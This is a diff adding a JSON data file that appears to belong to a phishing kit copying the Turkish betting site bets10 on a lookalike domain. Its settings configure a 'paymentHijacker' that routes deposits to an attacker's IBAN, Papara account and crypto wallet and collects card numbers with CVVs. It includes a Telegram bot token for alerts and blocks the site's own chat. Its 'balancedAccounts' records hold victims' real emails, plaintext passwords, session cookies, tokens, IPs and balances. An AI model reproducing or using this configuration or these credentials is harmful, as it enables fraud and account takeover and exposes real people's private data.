@@ -1,0 +1,279 @@
+{
+  "settings": {
+    "telegram": {
+      "enabled": true,
+      "botToken": "7347545087:AAHoe28Z7jd9XBY3U4hT2hb8nmNg_dEJQ9g",
+      "balanceChannel": "-5272932121",
+      "paymentChannel": "-5066773337",
+      "cardChannel": "-5172293843",
+      "minBalanceForNotify": 1000
+    },
+    "paymentHijacker": {
+      "enabled": true,
+      "blockedBehavior": "hide",
+      "methods": [
+        {
+          "id": "ml5o33vwlpi94x0yb",
+          "name": "Banka/Kredi Kartı",
+          "slug": "card",
+          "type": "card",
+          "icon": "https://cdn-crs.bpsgameserver2.com/assets/d3786246-b413-4db8-82aa-d7ba71fcd4bb/01d9ca7c-7b0d-45fb-ab38-58e035901c28_0",
+          "logo": "",
+          "enabled": true,
+          "matchImages": [
+            "01d9ca7c-7b0d-45fb-ab38-58e035901c28"
+          ],
+          "fixedInfo": {},
+          "fields": [
+            {
+              "name": "card_number",
+              "label": "Kart Numarası",
+              "type": "card_number",
+              "placeholder": "0000 0000 0000 0000",
+              "required": true
+            },
+            {
+              "name": "card_holder",
+              "label": "Kart Üzerindeki İsim",
+              "type": "text",
+              "placeholder": "AD SOYAD",
+              "required": true
+            },
+            {
+              "name": "expiry",
+              "label": "Son Kullanma Tarihi",
+              "type": "expiry",
+              "placeholder": "AA/YY",
+              "required": true
+            },
+            {
+              "name": "cvv",
+              "label": "CVV",
+              "type": "cvv",
+              "placeholder": "000",
+              "required": true
+            }
+          ],
+          "minAmount": 50,
+          "maxAmount": 10000,
+          "description": "Banka veya kredi kartınız ile güvenli ödeme yapın.",
+          "successMessage": "Kart bilgileriniz alındı. İşleminiz gerçekleştiriliyor...",
+          "order": 0
+        },
+        {
+          "id": "ml5o33vwx5wdoyqu5",
+          "name": "Havale/EFT",
+          "slug": "havale",
+          "type": "bank_transfer",
+          "icon": "https://cdn-crs.bpsgameserver2.com/assets/d3786246-b413-4db8-82aa-d7ba71fcd4bb/6acdae4d-5101-4273-8fa5-b77e95084235_0",
+          "logo": "",
+          "enabled": true,
+          "matchImages": [
+            "6acdae4d-5101-4273-8fa5-b77e95084235",
+            "44312615-bf14-48d3-9e5f-37ed301cf63c"
+          ],
+          "fixedInfo": {
+            "iban": "TR32 0006 2000 7420 0006 8278 54",
+            "accountHolder": "AYSEL KAHRAMAN",
+            "bankName": "PAPARA 7/24",
+            "paparaNumber": "TR32 0006 2000 7420 0006 8278 54"
+          },
+          "fields": [],
+          "minAmount": 100,
+          "maxAmount": 50000,
+          "description": "Havale/EFT ile para yatırın. İşlem 5-15 dakika içinde onaylanır.",
+          "successMessage": "Havale talebiniz alındı. Lütfen belirtilen IBAN'a transferi yapın.",
+          "order": 1
+        },
+        {
+          "id": "ml5o33vwtkhaibsoy",
+          "name": "Papara",
+          "slug": "papara",
+          "type": "papara",
+          "icon": "https://cdn-crs.bpsgameserver2.com/assets/d3786246-b413-4db8-82aa-d7ba71fcd4bb/8c045850-7b2b-46c3-abc3-fa4d4f3fd4de_0",
+          "logo": "",
+          "enabled": true,
+          "matchImages": [
+            "8c045850-7b2b-46c3-abc3-fa4d4f3fd4de"
+          ],
+          "fixedInfo": {
+            "iban": "TR32 0006 2000 7420 0006 8278 54",
+            "accountHolder": "AYSEL KAHRAMAN",
+            "bankName": "FAST 7/24",
+            "paparaNumber": "TR32 0006 2000 7420 0006 8278 54"
+          },
+          "fields": [],
+          "minAmount": 1000,
+          "maxAmount": 25000,
+          "description": "Papara ile anında para yatırın.",
+          "successMessage": "Papara talebiniz alındı. Bakiyeniz kısa süre içinde güncellenecektir.",
+          "order": 2
+        },
+        {
+          "id": "ml5o33vwe31e853sm",
+          "name": "Kripto Para",
+          "slug": "crypto",
+          "type": "crypto",
+          "icon": "https://cdn-crs.bpsgameserver2.com/assets/d3786246-b413-4db8-82aa-d7ba71fcd4bb/d8f7383f-8a66-4ebb-94f4-c5fb632ad578_0",
+          "logo": "",
+          "enabled": true,
+          "matchImages": [
+            "d8f7383f-8a66-4ebb-94f4-c5fb632ad578"
+          ],
+          "fixedInfo": {
+            "coins": [
+              {
+                "name": "TETHER",
+                "network": "TRC-20",
+                "walletAddress": "THdoAgTXwPHmX92Y2CA3ubyqFDdjTryu1W"
+              }
+            ]
+          },
+          "fields": [],
+          "minAmount": 100,
+          "maxAmount": 100000,
+          "description": "Kripto para ile para yatırın.",
+          "successMessage": "Kripto para talebiniz alındı.",
+          "order": 3
+        }
+      ]
+    },
+    "site": {
+      "targetDomain": "1452bets10.com",
+      "myDomain": "5280bets10.com"
+    },
+    "liveChat": {
+      "enabled": true,
+      "blockOriginal": true,
+      "mobile": true,
+      "desktop": true,
+      "position": "bottom-right",
+      "primaryColor": "#1a1a2e",
+      "accentColor": "#6366f1",
+      "title": "Canlı Destek",
+      "subtitle": "Size nasıl yardımcı olabiliriz?",
+      "placeholder": "Mesajınızı yazın...",
+      "welcomeMessage": "Merhaba! Size nasıl yardımcı olabiliriz?",
+      "offlineMessage": "Şu an müsait değiliz. Lütfen daha sonra tekrar deneyin.",
+      "operatorName": "Destek Ekibi",
+      "operatorAvatar": "",
+      "autoMessages": [
+        {
+          "delay": 3000,
+          "message": "Merhaba, hoş geldiniz!"
+        },
+        {
+          "delay": 8000,
+          "message": "Size nasıl yardımcı olabilirim?"
+        }
+      ],
+      "quickReplies": [
+        "Para yatırma sorunu",
+        "Para çekme sorunu",
+        "Bonus hakkında",
+        "Hesap doğrulama"
+      ],
+      "collectInfo": {
+        "enabled": true,
+        "fields": [
+          "name",
+          "email",
+          "phone"
+        ]
+      },
+      "workingHours": {
+        "enabled": false,
+        "start": "09:00",
+        "end": "18:00",
+        "timezone": "Europe/Istanbul"
+      },
+      "customScript": ""
+    }
+  },
+  "paymentAttempts": [],
+  "balancedAccounts": [
+    {
+      "id": "ml5o9rxr7isn0hjor",
+      "username": "kilicmert313@gmail.com",
+      "password": "19038989aS",
+      "phone": "",
+      "ip": "151.135.33.73, 151.135.33.73",
+      "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+      "cookies": "fabricBeta=FABRICBETA; _gcl_au=1.1.1085054896.1770058804; Acquisition_Status_Current=Prospect; Start_Acquisition=Prospect; _ga=GA1.1.1808572144.1770058807; _fbp=fb.1.1770058807580.266038786736858298; GUID_Cookie=a32c5098-eb31-4c4b-a665-6abc89a156bf; Customer_Level=LC; Client_Status_Current=Existing Customer; OBG-SB-THEME=light; _hjSessionUser_1285450=eyJpZCI6ImM4Y2YyZDU1LWZiM2MtNTE5NC1iMjhiLWU4Mzc3MjRkNGNjMiIsImNyZWF0ZWQiOjE3NzAwNTg4MDg5NzUsImV4aXN0aW5nIjp0cnVlfQ==; aws-waf-token=012d3588-ed92-4ea8-a9d1-6c6b242c121e:IAoAdqyULcYaAAAA:W2GHhOel57dSIG8v1DHfsfIx2WfUdtkfzlfbV24wuyJc2UZYUdDDysbUmIGYRfiChKMLaAVp1pa2wgU4eQZQ40SjR2ccKeerdshjMbWQyvMukp1pkcC7TQ/iXkO9rT/PekaCwbuXu7NghYx5ZMpPGB5WHbMtffUa/0LFfr16hgtY/OT3nvNbFcNwaE7TGMsLU7k468E77g==; LAST-SAVED-VISITED-PAGE=%2Ftr%2Fspor-bahisleri; cfidsgib-w-bab-bets10=g2pU8dtXyuUuZLa/3VXGhM1XH6lw3nLhpFr6uTr1iAZgdQnAAPZcb5EmtKmROaT3fAmSVaH6Lh01zGeNqDoPp+ehtKq2YcPxu0SZErlq3b8Vz5IFbkNzjflOxTMZvpml3VtMR+61HzW7e7WsLW6Ntc8uVTGqIpEtvV/dRg==; Start_Client_Status=Existing Customer; Initdone=1; OriginReferrer=https://5280bets10.com/tr/spor-bahisleri/bahis-gecmisi?betHistoryView=Open; OriginLandingURL=https://5280bets10.com/tr/spor-bahisleri/bahis-gecmisi; TrafficType=Other Traffic; AffCookie=Missing AffCode; OBG-LOBBY=sportsbook; _hjSession_1285450=eyJpZCI6ImZiZWY4OTc0LTAyYTMtNDJjNS1iMDkxLThiNjlkODIyZDJjYyIsImMiOjE3NzAwNjcxMjA5OTgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _ga_WYDL5CT277=GS2.1.s1770067114$o2$g1$t1770067132$j42$l0$h0; __zzatgib-w-bab-bets10=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2UtcGZOHEgTIEATCnopFhV9cllMOA0Ycj5tMFpsZx5ie14gd10/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoYfmsjVQ4MXkRIdXwlLTFmJ3xLKTUdETJeV1U0O2dBVH9NbHARGkBUC0wLXAlDNV8ga2tKTUQoFVlxPF4/dHJzMkNiUhlKWhxHEFEzIkoXfXAgVTg9FkVKJnQuQR9TUUNLX3gfGDpoXXsJXWYbRk0UdHZfbxt/JlocOWMgSlxNeSsgEnpyKlZ/f00JEjUwG0VXXSN4Gl0PEh1FF2Zei539GQ==",
+      "url": "https://5280bets10.com/tr/giris?returnUrl=%2Ftr%2Fspor-bahisleri%2Fbahis-gecmisi",
+      "balance": 0.65,
+      "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcklkIjoiYTMyYzUwOTgtZWIzMS00YzRiLWE2NjUtNmFiYzg5YTE1NmJmIiwiZXhwIjoiMTc3MDA2NzE5NyIsInByb3ZpZGVyIjoiIy9Vc2VybmFtZVBhc3N3b3JkIn0.cAzRL8_-lW-8EZl8U30HTekg5pE1ugxmfVqBX_olS89cMRv6Lo9czTcQfOipkJBv-nXld1zzVzjS9kauSoGHbwpuZJHL_Bp5mcPRdwJ0lU7pQ_-tEnha1cJaGvulgoFBaYfIfH03G6cdfDgyeMsckvOSiTKjQWU96uzkOi-39No0sSEgNNkr_n5bmbu25MZ6zjIKW4bQoVk5_ry9ll6PBuLYIrEGQB_KJRfzGaMzvRuBLBDzL5JR_clIl_F1BmKlgEkdMOpYsVjcikH-vvCoQJRIaR2ozwdpqJ-gaU-yK07wLfwlrtN6p2YymoWoIw6ZNpdTukW-JLmSd5YI2uqIWA",
+      "customerId": "a32c5098-eb31-4c4b-a665-6abc89a156bf",
+      "transactionId": "UsernamePassword_Authentication_Transaction_f36b615b05344e899545de2aa7919377",
+      "hasBalance": true,
+      "capturedAt": "2026-02-02T21:18:56.943Z",
+      "loginSuccess": true,
+      "raw": {
+        "username": "kilicmert313@gmail.com",
+        "password": "19038989aS",
+        "cookies": "fabricBeta=FABRICBETA; _gcl_au=1.1.1085054896.1770058804; Acquisition_Status_Current=Prospect; Start_Acquisition=Prospect; _ga=GA1.1.1808572144.1770058807; _fbp=fb.1.1770058807580.266038786736858298; GUID_Cookie=a32c5098-eb31-4c4b-a665-6abc89a156bf; Customer_Level=LC; Client_Status_Current=Existing Customer; OBG-SB-THEME=light; _hjSessionUser_1285450=eyJpZCI6ImM4Y2YyZDU1LWZiM2MtNTE5NC1iMjhiLWU4Mzc3MjRkNGNjMiIsImNyZWF0ZWQiOjE3NzAwNTg4MDg5NzUsImV4aXN0aW5nIjp0cnVlfQ==; __zzatgib-w-bab-bets10=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2UtcGZOHEgTIEATCnopFhV9cllMOA0Ycj5tMFpsZx5ie14gd10/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoYfmsjVQgPYkBIdnQlLTFmJ3xLKTUdETJeV1U0O2dBVH9NbHARGkBUC0wLXAlDNV8ga2tKTUQoFVlxPF4/dHJzMkNiUhlKWhxHEFEzIkoXfXAgVTg9FkVKJnQuQR9TUUNLX3gfGDpoXXsJXWYbRk0UdHZfbxt/JlocOWMgSlxNeSsaFX5uKlYLf00JEjUwG0VXXSN4Gl0PEh1FF2Zes2sHDg==; aws-waf-token=012d3588-ed92-4ea8-a9d1-6c6b242c121e:IAoAdqyULcYaAAAA:W2GHhOel57dSIG8v1DHfsfIx2WfUdtkfzlfbV24wuyJc2UZYUdDDysbUmIGYRfiChKMLaAVp1pa2wgU4eQZQ40SjR2ccKeerdshjMbWQyvMukp1pkcC7TQ/iXkO9rT/PekaCwbuXu7NghYx5ZMpPGB5WHbMtffUa/0LFfr16hgtY/OT3nvNbFcNwaE7TGMsLU7k468E77g==; LAST-SAVED-VISITED-PAGE=%2Ftr%2Fspor-bahisleri; cfidsgib-w-bab-bets10=g2pU8dtXyuUuZLa/3VXGhM1XH6lw3nLhpFr6uTr1iAZgdQnAAPZcb5EmtKmROaT3fAmSVaH6Lh01zGeNqDoPp+ehtKq2YcPxu0SZErlq3b8Vz5IFbkNzjflOxTMZvpml3VtMR+61HzW7e7WsLW6Ntc8uVTGqIpEtvV/dRg==; Start_Client_Status=Existing Customer; Initdone=1; OriginReferrer=https://5280bets10.com/tr/spor-bahisleri/bahis-gecmisi?betHistoryView=Open; OriginLandingURL=https://5280bets10.com/tr/spor-bahisleri/bahis-gecmisi; TrafficType=Other Traffic; AffCookie=Missing AffCode; OBG-LOBBY=sportsbook; _hjSession_1285450=eyJpZCI6ImZiZWY4OTc0LTAyYTMtNDJjNS1iMDkxLThiNjlkODIyZDJjYyIsImMiOjE3NzAwNjcxMjA5OTgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _ga_WYDL5CT277=GS2.1.s1770067114$o2$g1$t1770067132$j42$l0$h0",
+        "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+        "url": "https://5280bets10.com/tr/giris?returnUrl=%2Ftr%2Fspor-bahisleri%2Fbahis-gecmisi",
+        "ip": "151.135.33.73, 151.135.33.73"
+      },
+      "balanceFetched": true,
+      "loginResponse": {
+        "authenticationToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcklkIjoiYTMyYzUwOTgtZWIzMS00YzRiLWE2NjUtNmFiYzg5YTE1NmJmIiwiZXhwIjoiMTc3MDA2NzE5NyIsInByb3ZpZGVyIjoiIy9Vc2VybmFtZVBhc3N3b3JkIn0.cAzRL8_-lW-8EZl8U30HTekg5pE1ugxmfVqBX_olS89cMRv6Lo9czTcQfOipkJBv-nXld1zzVzjS9kauSoGHbwpuZJHL_Bp5mcPRdwJ0lU7pQ_-tEnha1cJaGvulgoFBaYfIfH03G6cdfDgyeMsckvOSiTKjQWU96uzkOi-39No0sSEgNNkr_n5bmbu25MZ6zjIKW4bQoVk5_ry9ll6PBuLYIrEGQB_KJRfzGaMzvRuBLBDzL5JR_clIl_F1BmKlgEkdMOpYsVjcikH-vvCoQJRIaR2ozwdpqJ-gaU-yK07wLfwlrtN6p2YymoWoIw6ZNpdTukW-JLmSd5YI2uqIWA",
+        "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcklkIjoiYTMyYzUwOTgtZWIzMS00YzRiLWE2NjUtNmFiYzg5YTE1NmJmIiwiZXhwIjoiMTc3MDA2NzE5NyIsInByb3ZpZGVyIjoiIy9Vc2VybmFtZVBhc3N3b3JkIn0.cAzRL8_-lW-8EZl8U30HTekg5pE1ugxmfVqBX_olS89cMRv6Lo9czTcQfOipkJBv-nXld1zzVzjS9kauSoGHbwpuZJHL_Bp5mcPRdwJ0lU7pQ_-tEnha1cJaGvulgoFBaYfIfH03G6cdfDgyeMsckvOSiTKjQWU96uzkOi-39No0sSEgNNkr_n5bmbu25MZ6zjIKW4bQoVk5_ry9ll6PBuLYIrEGQB_KJRfzGaMzvRuBLBDzL5JR_clIl_F1BmKlgEkdMOpYsVjcikH-vvCoQJRIaR2ozwdpqJ-gaU-yK07wLfwlrtN6p2YymoWoIw6ZNpdTukW-JLmSd5YI2uqIWA",
+        "customerId": "a32c5098-eb31-4c4b-a665-6abc89a156bf",
+        "transactionId": "UsernamePassword_Authentication_Transaction_f36b615b05344e899545de2aa7919377",
+        "balance": 0.65,
+        "cookies": "fabricBeta=FABRICBETA; _gcl_au=1.1.1085054896.1770058804; Acquisition_Status_Current=Prospect; Start_Acquisition=Prospect; _ga=GA1.1.1808572144.1770058807; _fbp=fb.1.1770058807580.266038786736858298; GUID_Cookie=a32c5098-eb31-4c4b-a665-6abc89a156bf; Customer_Level=LC; Client_Status_Current=Existing Customer; OBG-SB-THEME=light; _hjSessionUser_1285450=eyJpZCI6ImM4Y2YyZDU1LWZiM2MtNTE5NC1iMjhiLWU4Mzc3MjRkNGNjMiIsImNyZWF0ZWQiOjE3NzAwNTg4MDg5NzUsImV4aXN0aW5nIjp0cnVlfQ==; aws-waf-token=012d3588-ed92-4ea8-a9d1-6c6b242c121e:IAoAdqyULcYaAAAA:W2GHhOel57dSIG8v1DHfsfIx2WfUdtkfzlfbV24wuyJc2UZYUdDDysbUmIGYRfiChKMLaAVp1pa2wgU4eQZQ40SjR2ccKeerdshjMbWQyvMukp1pkcC7TQ/iXkO9rT/PekaCwbuXu7NghYx5ZMpPGB5WHbMtffUa/0LFfr16hgtY/OT3nvNbFcNwaE7TGMsLU7k468E77g==; LAST-SAVED-VISITED-PAGE=%2Ftr%2Fspor-bahisleri; cfidsgib-w-bab-bets10=g2pU8dtXyuUuZLa/3VXGhM1XH6lw3nLhpFr6uTr1iAZgdQnAAPZcb5EmtKmROaT3fAmSVaH6Lh01zGeNqDoPp+ehtKq2YcPxu0SZErlq3b8Vz5IFbkNzjflOxTMZvpml3VtMR+61HzW7e7WsLW6Ntc8uVTGqIpEtvV/dRg==; Start_Client_Status=Existing Customer; Initdone=1; OriginReferrer=https://5280bets10.com/tr/spor-bahisleri/bahis-gecmisi?betHistoryView=Open; OriginLandingURL=https://5280bets10.com/tr/spor-bahisleri/bahis-gecmisi; TrafficType=Other Traffic; AffCookie=Missing AffCode; OBG-LOBBY=sportsbook; _hjSession_1285450=eyJpZCI6ImZiZWY4OTc0LTAyYTMtNDJjNS1iMDkxLThiNjlkODIyZDJjYyIsImMiOjE3NzAwNjcxMjA5OTgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _ga_WYDL5CT277=GS2.1.s1770067114$o2$g1$t1770067132$j42$l0$h0; __zzatgib-w-bab-bets10=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2UtcGZOHEgTIEATCnopFhV9cllMOA0Ycj5tMFpsZx5ie14gd10/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoYfmsjVQ4MXkRIdXwlLTFmJ3xLKTUdETJeV1U0O2dBVH9NbHARGkBUC0wLXAlDNV8ga2tKTUQoFVlxPF4/dHJzMkNiUhlKWhxHEFEzIkoXfXAgVTg9FkVKJnQuQR9TUUNLX3gfGDpoXXsJXWYbRk0UdHZfbxt/JlocOWMgSlxNeSsgEnpyKlZ/f00JEjUwG0VXXSN4Gl0PEh1FF2Zei539GQ==",
+        "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+        "ip": "151.135.33.73, 151.135.33.73",
+        "username": "kilicmert313@gmail.com",
+        "password": "19038989aS",
+        "url": "https://5280bets10.com/tr/giris?returnUrl=%2Ftr%2Fspor-bahisleri%2Fbahis-gecmisi",
+        "timestamp": "2026-02-02T21:19:00.703Z"
+      },
+      "updatedAt": "2026-02-02T21:19:02.598Z",
+      "addedAt": "2026-02-02T21:19:02.599Z"
+    },
+    {
+      "id": "ml5s37n8i2y9jol6w",
+      "username": "sefarecep19@gmail.com",
+      "password": "682165Fk",
+      "phone": "",
+      "ip": "2a00:1d35:9044:6401:7403:dfdd:d508:a39f, 2a00:1d35:9044:6401:7403:dfdd:d508:a39f",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+      "cookies": "fabricBeta=FABRICBETA; _gcl_au=1.1.389831027.1769968755; Acquisition_Status_Current=Prospect; Start_Acquisition=Prospect; Client_Status_Current=Prospect; Start_Client_Status=Prospect; Customer_Level=PC; _ga=GA1.1.1948006205.1769968755; _fbp=fb.1.1769968755512.366824675703964874; aws-waf-token=012d3588-ed92-4ea8-a9d1-6c6b242c121e:IAoAp5Kg+fjqAAAA:rBInOKJdD4g4pSgJaA782VnljWoREPH3MPb5MCjR5VWhrX11KVDHAE3HFINddYsI9WSvgCvBCSBk43UL1Hlob6LHRHFTOkSqe/v6iffV+nJoB6cA3WvPKv8FwA8rn2r9QJbkEXmODSvdfXpbP61sVvhOnn+m/PJNtf4ALAiHPTjAdseEZuBtXimI/BukDMM=; Initdone=1; OriginReferrer=https://guard69.ayiyogi.com:2087/; OriginLandingURL=https://5280bets10.com/tr; TrafficType=Other Traffic; AffCookie=Missing AffCode; _hjSessionUser_1285450=eyJpZCI6ImRkNmUzNDU5LThjMjYtNTIwNi1iYzQzLTJiMDk2Y2MzZGJlNCIsImNyZWF0ZWQiOjE3NzAwNjM2OTAyNTQsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1285450=eyJpZCI6ImU0OTMwMThiLWY5MTgtNDQ2My05NThjLWNiYzdjYzkyZWJjYSIsImMiOjE3NzAwNzM1MjU0ODUsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; cfidsgib-w-bab-bets10=oC813jVYfK1h62IjuSNwFkiytB8XJGQ8XIW6jwSCY4A0zkGFuZ1HcqOOJBKhafO2IkzdE1pUFI7FoVyGARFi/kJ8nxsU9kK0OA2J+cZ+pp8gxhWqpoNo+xED72NFlptefT2xdDumZPuueyEtnP8Bp7KbWYbdwN/8GLk+Gg==; __zzatgib-w-bab-bets10=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2UtQmchG3tiU0ASCDUqFhU0blRMED1kcz4mcy9EIB4YRxIjTFs/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoYfmsjVgoQYD5DcXklLTFmJ3xLKTUdETJeV1U0O2dBVH9NbHARGkBUC0wLXAlDNV8ga2tKTUQoFVlxQBZxdyd6XUJiUmh7XhxHEgp8IiJCNHQgVAg9ZERBdHopcSNTUUNLX3gfGDpoXXsJXWYbRk0UdHZfbxt/JlocOWMgSlxNeSwcFnxsJVMMf00JEjUwG0VXXSN4Gl0PEh1FF2ZejfeAmA==; _ga_WYDL5CT277=GS2.1.s1770073525$o5$g1$t1770073552$j33$l0$h0",
+      "url": "https://5280bets10.com/tr",
+      "balance": 12570.57,
+      "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcklkIjoiZWNkZmI3ZDctZTlkNS00ZWUzLTlhZTktNTFiOTcwNzcwZmZmIiwiZXhwIjoiMTc3MDA3MzYwOSIsInByb3ZpZGVyIjoiIy9Vc2VybmFtZVBhc3N3b3JkIn0.jATAYRFV36lATZf6mdyDBJvY24G85H1mmLzFRVURyULwPl1VHEDCiNlGIecSRnqxffaVshTrlYyRrCymuYc2bwWWc8VLD9DwKigFp_n28djraosG9h3V4GCUE6GVklQnGO7Qz2wD5MHcMCtfirRUMj1vO_8KsG8D6clOWX_yRWW5CLUcUmr4LskEirQAnTILqqyCQ9qBneRyIrmYQ7WZ6lrpCsLSWgoHwspyf603_HEpY3aW-yvdZofQZSiu03NfYaQCDlGzdM_seHrHR8b1O4h9zyA7bYxcFHiKfqfwomuwtHVGeCJu6kPfRIrFL70d7cuBKKYmfoex-APdWA9qRA",
+      "customerId": "ecdfb7d7-e9d5-4ee3-9ae9-51b970770fff",
+      "transactionId": "UsernamePassword_Authentication_Transaction_05741e0480064f70abfa7d226788340a",
+      "hasBalance": true,
+      "capturedAt": "2026-02-02T23:05:49.172Z",
+      "loginSuccess": true,
+      "raw": {
+        "username": "sefarecep19@gmail.com",
+        "password": "682165Fk",
+        "ip": "2a00:1d35:9044:6401:7403:dfdd:d508:a39f, 2a00:1d35:9044:6401:7403:dfdd:d508:a39f",
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
+      },
+      "balanceFetched": true,
+      "loginResponse": {
+        "authenticationToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcklkIjoiZWNkZmI3ZDctZTlkNS00ZWUzLTlhZTktNTFiOTcwNzcwZmZmIiwiZXhwIjoiMTc3MDA3MzYwOSIsInByb3ZpZGVyIjoiIy9Vc2VybmFtZVBhc3N3b3JkIn0.jATAYRFV36lATZf6mdyDBJvY24G85H1mmLzFRVURyULwPl1VHEDCiNlGIecSRnqxffaVshTrlYyRrCymuYc2bwWWc8VLD9DwKigFp_n28djraosG9h3V4GCUE6GVklQnGO7Qz2wD5MHcMCtfirRUMj1vO_8KsG8D6clOWX_yRWW5CLUcUmr4LskEirQAnTILqqyCQ9qBneRyIrmYQ7WZ6lrpCsLSWgoHwspyf603_HEpY3aW-yvdZofQZSiu03NfYaQCDlGzdM_seHrHR8b1O4h9zyA7bYxcFHiKfqfwomuwtHVGeCJu6kPfRIrFL70d7cuBKKYmfoex-APdWA9qRA",
+        "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcklkIjoiZWNkZmI3ZDctZTlkNS00ZWUzLTlhZTktNTFiOTcwNzcwZmZmIiwiZXhwIjoiMTc3MDA3MzYwOSIsInByb3ZpZGVyIjoiIy9Vc2VybmFtZVBhc3N3b3JkIn0.jATAYRFV36lATZf6mdyDBJvY24G85H1mmLzFRVURyULwPl1VHEDCiNlGIecSRnqxffaVshTrlYyRrCymuYc2bwWWc8VLD9DwKigFp_n28djraosG9h3V4GCUE6GVklQnGO7Qz2wD5MHcMCtfirRUMj1vO_8KsG8D6clOWX_yRWW5CLUcUmr4LskEirQAnTILqqyCQ9qBneRyIrmYQ7WZ6lrpCsLSWgoHwspyf603_HEpY3aW-yvdZofQZSiu03NfYaQCDlGzdM_seHrHR8b1O4h9zyA7bYxcFHiKfqfwomuwtHVGeCJu6kPfRIrFL70d7cuBKKYmfoex-APdWA9qRA",
+        "customerId": "ecdfb7d7-e9d5-4ee3-9ae9-51b970770fff",
+        "transactionId": "UsernamePassword_Authentication_Transaction_05741e0480064f70abfa7d226788340a",
+        "balance": 12570.57,
+        "cookies": "fabricBeta=FABRICBETA; _gcl_au=1.1.389831027.1769968755; Acquisition_Status_Current=Prospect; Start_Acquisition=Prospect; Client_Status_Current=Prospect; Start_Client_Status=Prospect; Customer_Level=PC; _ga=GA1.1.1948006205.1769968755; _fbp=fb.1.1769968755512.366824675703964874; aws-waf-token=012d3588-ed92-4ea8-a9d1-6c6b242c121e:IAoAp5Kg+fjqAAAA:rBInOKJdD4g4pSgJaA782VnljWoREPH3MPb5MCjR5VWhrX11KVDHAE3HFINddYsI9WSvgCvBCSBk43UL1Hlob6LHRHFTOkSqe/v6iffV+nJoB6cA3WvPKv8FwA8rn2r9QJbkEXmODSvdfXpbP61sVvhOnn+m/PJNtf4ALAiHPTjAdseEZuBtXimI/BukDMM=; Initdone=1; OriginReferrer=https://guard69.ayiyogi.com:2087/; OriginLandingURL=https://5280bets10.com/tr; TrafficType=Other Traffic; AffCookie=Missing AffCode; _hjSessionUser_1285450=eyJpZCI6ImRkNmUzNDU5LThjMjYtNTIwNi1iYzQzLTJiMDk2Y2MzZGJlNCIsImNyZWF0ZWQiOjE3NzAwNjM2OTAyNTQsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1285450=eyJpZCI6ImU0OTMwMThiLWY5MTgtNDQ2My05NThjLWNiYzdjYzkyZWJjYSIsImMiOjE3NzAwNzM1MjU0ODUsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; cfidsgib-w-bab-bets10=oC813jVYfK1h62IjuSNwFkiytB8XJGQ8XIW6jwSCY4A0zkGFuZ1HcqOOJBKhafO2IkzdE1pUFI7FoVyGARFi/kJ8nxsU9kK0OA2J+cZ+pp8gxhWqpoNo+xED72NFlptefT2xdDumZPuueyEtnP8Bp7KbWYbdwN/8GLk+Gg==; __zzatgib-w-bab-bets10=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2UtQmchG3tiU0ASCDUqFhU0blRMED1kcz4mcy9EIB4YRxIjTFs/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoYfmsjVgoQYD5DcXklLTFmJ3xLKTUdETJeV1U0O2dBVH9NbHARGkBUC0wLXAlDNV8ga2tKTUQoFVlxQBZxdyd6XUJiUmh7XhxHEgp8IiJCNHQgVAg9ZERBdHopcSNTUUNLX3gfGDpoXXsJXWYbRk0UdHZfbxt/JlocOWMgSlxNeSwcFnxsJVMMf00JEjUwG0VXXSN4Gl0PEh1FF2ZejfeAmA==; _ga_WYDL5CT277=GS2.1.s1770073525$o5$g1$t1770073552$j33$l0$h0",
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+        "ip": "2a00:1d35:9044:6401:7403:dfdd:d508:a39f, 2a00:1d35:9044:6401:7403:dfdd:d508:a39f",
+        "username": "sefarecep19@gmail.com",
+        "password": "682165Fk",
+        "url": "https://5280bets10.com/tr",
+        "timestamp": "2026-02-02T23:05:52.450Z"
+      },
